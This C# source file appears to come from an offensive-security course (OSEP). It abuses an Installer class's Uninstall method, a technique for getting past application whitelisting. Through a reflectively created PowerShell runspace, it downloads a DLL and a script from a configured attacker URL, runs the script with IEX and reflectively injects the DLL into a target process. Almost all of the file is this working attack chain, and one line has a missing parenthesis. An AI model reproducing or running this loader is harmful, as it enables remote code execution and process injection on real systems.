using System;
using System.Configuration.Install;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Try Harder???");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public async override void Uninstall(System.Collections.IDictionary savedState)
        {
            Debug.RunDebug("Uninstall bypass started.");


            StringBuilder sb = new StringBuilder();
            sb.Append($"${CONFIG.INVOKEREF_VARNAMEA} = (New-Object System.Net.WebClient).DownloadData('{CONFIG.HTTP_URL}/{CONFIG.INVOKEREF_HOSTED_DLL_NAME}');");
            sb.Append($"New-Object System.Net.WebClient).DownloadString('{CONFIG.HTTP_URL}/{CONFIG.INVOKEREF_HOSTED_SCRIPT_NAME}') | IEX;");
            sb.Append($"${CONFIG.INVOKEREF_VARNAMEB} = (Get-Process -Name {CONFIG.INVOKEREF_TARGET_PROCESS}).Id;");
            sb.Append($"Invoke-ReflectivePEInjection -PEBytes ${CONFIG.INVOKEREF_VARNAMEA} -ProcId ${CONFIG.INVOKEREF_VARNAMEB};");

            string script = sb.ToString();



            Debug.RunDebug("Locating SMA...");
            string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string[] locations = {
                Path.Combine(windir, @"System32\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
                Path.Combine(windir, @"SysWOW64\WindowsPowerShell\v1.0\System.Management.Automation.dll"),
                @"C:\Program Files\PowerShell\7\System.Management.Automation.dll",
                @"C:\Program Files\PowerShell\7-preview\System.Management.Automation.dll"
            };

            string dllPath = locations.FirstOrDefault(File.Exists);


            Debug.RunDebug("Loading SMA assembly...");
            Assembly sma;
            if (dllPath != null)
            {
                sma = Assembly.LoadFrom(dllPath);
            }
            else
            {
                sma = Assembly.Load(
                "System.Management.Automation, " +
                "Version=3.0.0.0, " +
                "Culture=neutral, " +
                "PublicKeyToken=31bf3856ad364e35");
            }

            if (sma == null) {
                Debug.RunDebug("Cant find SMA. Aborting...");
                Environment.Exit(0); 
            }


            Debug.RunDebug("Invoking Script...");
            Type runspaceFactoryType = sma.GetType("System.Management.Automation.Runspaces.RunspaceFactory", throwOnError: true);
            Type powerShellType = sma.GetType("System.Management.Automation.PowerShell", throwOnError: true);
            object runspace = runspaceFactoryType.GetMethod("CreateRunspace", Type.EmptyTypes).Invoke(null, null);
            object powerShell = powerShellType.GetMethod("Create", Type.EmptyTypes).Invoke(null, null);
            runspace.GetType().GetMethod("Open", Type.EmptyTypes).Invoke(runspace, null);
            powerShellType.GetProperty("Runspace").SetValue(powerShell, runspace, null);
            powerShellType.GetMethod("AddScript", new[] { typeof(string) }).Invoke(powerShell, new object[] { script });

            MethodInfo invokeMethod = powerShellType.GetMethods(BindingFlags.Public | BindingFlags.Instance).Single(method =>
            method.Name == "Invoke" &&
            !method.IsGenericMethod &&
            method.GetParameters().Length == 0);

            invokeMethod.Invoke(powerShell, null);



            (powerShell as IDisposable)?.Dispose();
            (runspace as IDisposable)?.Dispose();

            Debug.RunDebug($"DLL Injected into {CONFIG.INVOKEREF_TARGET_PROCESS}...");
            Debug.RunDebug("Done...");
        }

        public static async Task<byte[]> DownloadFileAsync(string url)
        {
            using (var client = new HttpClient())
            {
                return await client.GetByteArrayAsync(url);
            }
        }
    }
}